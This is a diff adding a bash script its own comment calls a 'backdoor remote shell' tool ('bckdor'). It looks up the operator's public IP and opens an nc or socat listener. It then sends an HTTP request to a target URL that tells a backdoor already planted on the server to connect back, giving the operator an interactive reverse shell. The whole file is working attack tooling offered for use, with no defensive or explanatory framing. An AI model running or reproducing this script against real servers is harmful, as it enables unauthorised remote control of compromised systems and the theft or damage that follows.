@@ -1,0 +1,121 @@
+#!/bin/bash
+
+# This is backdoor remote shell scripts
+
+set -m
+
+out() { printf "$1 $2\n" "${@:3}"; }
+error() { out "==> ERROR:" "$@"; } >&2
+die() { error "$@"; exit 1; }
+TRUE=1
+FALSE=
+
+function url_split {
+    local url=$1
+    local url_base=$(echo $url | sed -e 's;http://;;')
+    local url_split=($(echo $url_base | sed -e 's;/; ;'))
+    local hostname=${url_split[0]}
+    local path=/${url_split[1]}
+    echo $hostname $path
+}
+
+function connect_nc {
+    sudo nc -l -n -v $port &
+    # exec remote shell now!
+    nc $target 80 < "$sendfile" 2>&1 >/dev/null &
+    fg %1
+    # clean up
+    sudo pkill nc
+    rm "$sendfile"
+    exit 0
+}
+
+function connect_socat {
+    sudo socat file:$(tty),raw,echo=0 tcp-listen:$port &
+    # exec remote shell now!
+    sleep 2
+    nc $target 80 < "$sendfile" 2>&1 >/dev/null &
+    fg %1
+    rm "$sendfile"
+    return 1
+}
+
+function info {
+    echo '[Target Information]'
+    echo url: $url
+    echo shell: $shell_path
+    echo hostname: $target
+    echo path: $path
+    echo port: $port
+    echo connect: $connect
+    echo IP: $host_ip
+    exit 0
+}
+
+function usage {
+    echo "bckdor [-c [nc or socat]] [-p port] [-t] [-i] url shell"
+    exit 1
+}
+
+while getopts ithp:c: OPT; do
+    case "$OPT" in
+        p)
+            port="$OPTARG"
+            ;;
+        c)
+            connect="$OPTARG"
+            ;;
+        i)
+            info=$TRUE
+            ;;
+        t)
+            test_run=$TRUE
+            ;;
+        h)
+            usage
+            ;;
+    esac
+done
+
+shift $(($OPTIND - 1))
+
+[[ $# < 1 ]] && usage 
+
+url=($(url_split $1))
+shell_path="$2"
+target=${url[0]}
+path=${url[1]}
+port=${port:=80}
+test_run=${test_run:=$FALSE}
+connect=${connect:="nc"}
+host_ip=$(wget -q -O - ipcheck.ieserver.net)
+
+[[ $info == $TRUE ]] && info
+
+sudo lsof -i:$port 1>/dev/null
+
+[[ $? == 1 ]] || die "port $port is already binding."
+
+sendfile=$(mktemp)
+cat > "$sendfile" <<EOF
+GET $path?port=${port}&ip=${host_ip}&shell=${shell_path}&connect=${connect} HTTP/1.1
+Host: $target
+
+EOF
+echo $test_run
+if [[ $test_run ]]; then
+    echo hoge
+    sed -ie "s; HTTP;\&info=True HTTP;" $sendfile
+    nc $target 80 < "$sendfile" 2>&1
+    rm "$sendfile"
+    exit 0
+fi
+
+case "$connect" in
+    nc|netcat)
+        connect_nc ;;
+    socat)
+        connect_socat ;;
+    *)
+        die "$connect must be nc or socat"
+esac
